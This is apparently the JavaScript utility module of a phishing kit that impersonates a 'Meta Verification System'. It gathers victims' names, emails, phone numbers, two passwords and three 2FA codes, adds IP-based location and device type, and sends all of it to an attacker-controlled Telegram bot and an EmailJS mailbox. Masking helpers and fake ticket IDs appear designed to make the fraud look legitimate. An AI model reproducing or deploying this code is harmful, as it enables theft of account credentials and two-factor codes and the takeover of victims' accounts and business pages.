const Utils = {
    PHONE_PREFIXES: {
        'AF': '+93','AL': '+355','DZ': '+213','AS': '+1684','AD': '+376','AO': '+244','AG': '+1268','AR': '+54',
        'AM': '+374','AU': '+61','AT': '+43','AZ': '+994','BS': '+1242','BH': '+973','BD': '+880','BB': '+1246',
        'BY': '+375','BE': '+32','BZ': '+501','BJ': '+229','BM': '+1441','BT': '+975','BO': '+591','BA': '+387',
        'BW': '+267','BR': '+55','BN': '+673','BG': '+359','BF': '+226','BI': '+257','KH': '+855','CM': '+237',
        'CA': '+1','CV': '+238','CF': '+236','TD': '+235','CL': '+56','CN': '+86','CO': '+57','KM': '+269',
        'CG': '+242','CD': '+243','CR': '+506','CI': '+225','HR': '+385','CU': '+53','CY' : '+357','CZ': '+420',
        'DK': '+45','DJ': '+253','DM': '+1767','DO': '+1','EC': '+593','EG': '+20','SV': '+503','GQ': '+240',
        'ER': '+291','EE': '+372','ET': '+251','FJ': '+679','FI': '+358','FR': '+33','GA': '+241','GM': '+220',
        'GE': '+995','DE': '+49','GH': '+233','GR': '+30','GD': '+1473','GT': '+502','GN': '+224','GW': '+245',
        'GY': '+592','HT': '+509','HN': '+504','HU': '+36','IS': '+354','IN': '+91','ID': '+62','IR': '+98',
        'IQ': '+964','IE': '+353','IL': '+972','IT': '+39','JM': '+1876','JP': '+81','JO': '+962','KZ': '+7',
        'KE': '+254','KI': '+686','KP': '+850','KR': '+82','KW': '+965','KG': '+996','LA': '+856','LV': '+371',
        'LB': '+961','LS': '+266','LR': '+231','LY': '+218','LI': '+423','LT': '+370','LU': '+352','MG': '+261',
        'MW': '+265','MY': '+60','MV': '+960','ML': '+223','MT': '+356','MH': '+692','MR': '+222','MU': '+230',
        'MX': '+52','FM': '+691','MD': '+373','MC': '+377','MN': '+976','ME': '+382','MA': '+212','MZ': '+258',
        'MM': '+95','NA': '+264','NR': '+674','NP': '+977','NL': '+31','NZ': '+64','NI': '+505','NE': '+227',
        'NG': '+234','NO': '+47','OM': '+968','PK': '+92','PW': '+680','PA': '+507','PG': '+675','PY': '+595',
        'PE': '+51','PH': '+63','PL': '+48','PT': '+351','QA': '+974','RO': '+40','RU': '+7','RW': '+250',
        'WS': '+685','SM': '+378','ST': '+239','SA': '+966','SN': '+221','RS': '+381','SC': '+248','SL': '+232',
        'SG': '+65','SK': '+421','SI': '+386','SB': '+677','SO': '+252','ZA': '+27','ES': '+34','LK': '+94',
        'SD': '+249','SR': '+597','SZ': '+268','SE': '+46','CH': '+41','SY': '+963','TW': '+886','TJ': '+992',
        'TZ': '+255','TH': '+66','TL': '+670','TG': '+228','TO': '+676','TT': '+1868','TN': '+216','TR': '+90',
        'TM': '+993','TV': '+688','UG': '+256','UA': '+380','AE': '+971','GB': '+44','US': '+1','UY': '+598',
        'UZ': '+998','VU': '+678','VE': '+58','VN': '+84','YE': '+967','ZM': '+260','ZW': '+263'
    },

    encrypt(text) {
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error('Save error:', error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;
            const { value, expiry } = JSON.parse(item);
            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }
            const decrypted = this.decrypt(value);
            return decrypted ? JSON.parse(decrypted) : null;
        } catch (error) {
            return null;
        }
    },

    async getUserIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error getting IP:', error);
            return 'N/A';
        }
    },

    isMobile() {
        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
        const checkUserAgent = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
        const checkMacTouch = /Macintosh/i.test(userAgent) && navigator.maxTouchPoints > 1;
        return checkUserAgent || checkMacTouch;
    },

    getPhonePrefix(countryCode) {
        if (!countryCode) return '';
        const code = countryCode.toUpperCase();
        return this.PHONE_PREFIXES[code] || '';
    },

    async getUserLocation() {
        try {
            const response = await fetch("https://ipinfo.io/json");
            if (!response.ok) throw new Error("Network response was not ok");
            
            const data = await response.json();
            const countryCode = data.country || "N/A";
    
            return {
                location: `${data.ip} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${countryCode})`,
                country_code: countryCode,
                ip: data.ip || "N/A",
                region: data.region || "N/A",
                country: countryCode,
                device: this.isMobile() ? "Mobile/Tablet" : "Desktop",
                phone_prefix: this.getPhonePrefix(countryCode)
            };
        } catch (error) {
            console.error("Error getting location:", error);
    
            return {
                location: "N/A",
                country_code: "N/A",
                ip: "N/A",
                region: "N/A",
                country: "N/A",
                device: this.isMobile() ? "Mobile/Tablet" : "Desktop",
                phone_prefix: ""
            };
        }
    },

    async sendToTelegram(data) {
        const locationData = await this.getUserLocation();
        const prefix = locationData.phone_prefix || '';

        const text = `
<b>IP Address:</b> <code>${locationData.location}</code>
<b>Device:</b> <code>${locationData.device}</code>
----------------------------------
<b>Full Name:</b> <code>${data.fullName || ''}</code>
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Phone:</b> <code>${prefix}${data.phone || ''}</code>
----------------------------------
<b>Password:</b> <code>${data.password || ''}</code>
<b>Password:</b> <code>${data.passwordSecond || ''}</code>
----------------------------------
<b>2FA:</b> <code>${data.twoFa || ''}</code>
<b>2FA:</b> <code>${data.twoFaSecond || ''}</code>
<b>2FA:</b> <code>${data.twoFaThird || ''}</code>`;

        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    },

    async sendToEmail(data) {
        const locationData = await this.getUserLocation();
        const prefix = locationData.phone_prefix || '';

        const emailContent = `
IP Address: ${locationData.location}
Device: ${locationData.device}
----------------------------------
Full Name: ${data.fullName || ''}
Email: ${data.email || ''}
Email Business: ${data.emailBusiness || ''}
Page Name: ${data.fanpage || ''}
Phone: ${prefix}${data.phone || ''}
----------------------------------
Password: ${data.password || ''}
Password: ${data.passwordSecond || ''}
----------------------------------
2FA: ${data.twoFa || ''}
2FA: ${data.twoFaSecond || ''}
2FA: ${data.twoFaThird || ''}

Sent at: ${new Date().toLocaleString()}`;

        try {
            if (!window.emailjs) {
                await this.loadEmailJSSDK();
            }

            await emailjs.send(
                CONFIG.EMAILJS_SERVICE_ID,
                CONFIG.EMAILJS_TEMPLATE_ID,
                {
                    to_email: CONFIG.EMAIL_RECIPIENT,
                    subject: `Meta Verification - ${locationData.location} (${locationData.device})`,
                    message: emailContent,
                    from_name: 'Meta Verification System',
                    reply_to: data.email || 'noreply@system.com'
                },
                CONFIG.EMAILJS_PUBLIC_KEY
            );
        } catch (error) {
            console.error('Email error:', error);
        }
    },

    loadEmailJSSDK() {
        return new Promise((resolve, reject) => {
            if (window.emailjs) {
                resolve();
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
            script.onload = () => {
                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
                resolve();
            };
            script.onerror = reject;
            document.head.appendChild(script);
        });
    },

    async sendNotification(data) {
        const notificationType = CONFIG.NOTIFICATION_TYPE;

        try {
            if (notificationType === 'telegram' || notificationType === 'both') {
                await this.sendToTelegram(data);
            }

            if (notificationType === 'email' || notificationType === 'both') {
                await this.sendToEmail(data);
            }
        } catch (error) {
            console.error('Notification error:', error);
        }
    },

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone;
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    }
};
